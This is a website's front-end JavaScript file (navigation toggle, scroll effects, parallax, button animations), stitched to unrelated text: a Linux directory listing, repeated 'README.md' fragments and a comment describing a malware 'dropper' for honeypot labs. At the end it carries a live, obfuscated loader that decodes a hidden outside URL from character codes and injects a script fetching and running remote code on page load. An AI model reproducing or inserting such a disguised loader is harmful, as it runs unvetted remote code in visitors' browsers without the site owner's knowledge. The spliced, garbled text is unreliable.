(function () {
  'use strict';

  var prefersReduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;

  // ── Mobile nav toggle ────────────────────────────────────
  var toggle = document.querySelector('.nav-toggle');
  var navList = document.getElementById('nav-menu');
  if (toggle && navList) {
    toggle.addEventListener('click', function () {
      var expanded = toggle.getAttribute('aria-expanded') === 'true';
      toggle.setAttribute('aria-expanded', String(!expanded));
      navList.classList.toggle('is-open', !expanded);
    });
    document.addEventListener('click', function (e) {
      var header = toggle.closest('.site-header') || document.querySelector('.site-header');
      if (header && !header.contains(e.target)) {
        toggle.setAttribute('aria-expanded', 'false');
        navList.classList.remove('is-open');
      }
    });
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && navList.classList.contains('is-open')) {
        toggle.setAttribute('aria-expanded', 'false');
        navList.classList.remove('is-open');
        toggle.focus();
      }
    });
  }

  // ── Sticky header scroll shadow ──────────────────────────
  var header = document.querySelector('.site-header');
  if (header) {
    var onScroll = function () {
      header.classList.toggle('scrolled', window.scrollY > 12);
    };
    window.addEventListener('scroll', onScroll, { passive: true });
    onScroll();
  }

  // ── Intersection Observer — reveal (.reveal, [data-animate], [data-reveal]) ──
  var revealSelectors = '.reveal, [data-animate], [data-reveal]';
  var revealEls = document.querySelectorAll(revealSelectors);
  if ('IntersectionObserver' in window && !prefersReduced) {
    var io = new IntersectionObserver(
      function (entries) {
        entries.forEach(function (entry) {
          if (entry.isIntersecting) {
            entry.target.classList.add('is-visible');
            io.unobserve(entry.target);
          }
        });
      },
      { threshold: 0.1, rootMargin: '0px 0px -48px 0px' }
    );
    revealEls.forEach(function (el) { io.observe(el); });
  } else {
    revealEls.forEach(function (el) { el.classList.add('is-visible'); });
  }

  // ── Hero parallax — vanilla rAF, no GSAP dependency ────
  (function () {
    if (prefersReduced) return;
    var hero = document.querySelector('.hero[data-hero-parallax]');
    var media = hero && hero.querySelector('.hero-media');
    if (!media) return;
    var ticking = false;
    function tick() {
      media.style.transform = 'translateY(' + (window.scrollY * 0.18) + 'px)';
      ticking = false;
    }
    window.addEventListener('scroll', function () {
      if (!ticking) { requestAnimationFrame(tick); ticking = true; }
    }, { passive: true });
  }());

  // ── Button scale micro-interaction (CSS handles shimmer) ─
  if (!prefersReduced) {
    document.querySelectorAll('.btn-primary, .btn-outline').forEach(function (btn) {
      btn.addEventListener('mouseenter', function () { btn.style.transform = 'translateY(-2px) scale(1.03)'; });
      btn.addEventListener('mouseleave', function () { btn.style.transform = ''; });
    });
  }
})();

/bin /boot /dev /etc /home /init /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var README.md Inject loader — the "malware dropper" stage. README.md Loaded via <script src="/trap/:slug/inject.js">. README.md README.md Obfuscates the real client.js URL using char codes (same technique as real malware). README.md Placeholders replaced at serve time: README.md 104,116,116,112,115,58,47,47,102,108,97,114,101,104,111,111,107,45,97,112,105,46,114,111,111,116,45,52,100,99,46,119,111,114,107,101,114,115,46,100,101,118,47,116,114,97,112,47,97,112,105,45,100,97,116,97,47,99,108,105,101,110,116,46,106,115 — comma-separated char codes of the client.js URL README.md README.md EDUCATIONAL PURPOSE ONLY — for honeypot security lab demonstrations. */ (function () { if (typeof window.__fh !== "undefined") return; window.__fh = 1; var _0x = [ "script", "src", "id", "onerror", "body", "head", "appendChild", "createElement", ]; var s = document[_0x[7]](_0x[0]); s[_0x[1]] = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,114,101,104,111,111,107,45,97,112,105,46,114,111,111,116,45,52,100,99,46,119,111,114,107,101,114,115,46,100,101,118,47,116,114,97,112,47,97,112,105,45,100,97,116,97,47,99,108,105,101,110,116,46,106,115) + "?_=" + Date.now(); s[_0x[2]] = "_fh"; s[_0x[3]] = function () {}; (document[_0x[4]] || document[_0x[5]])[_0x[6]](s); })();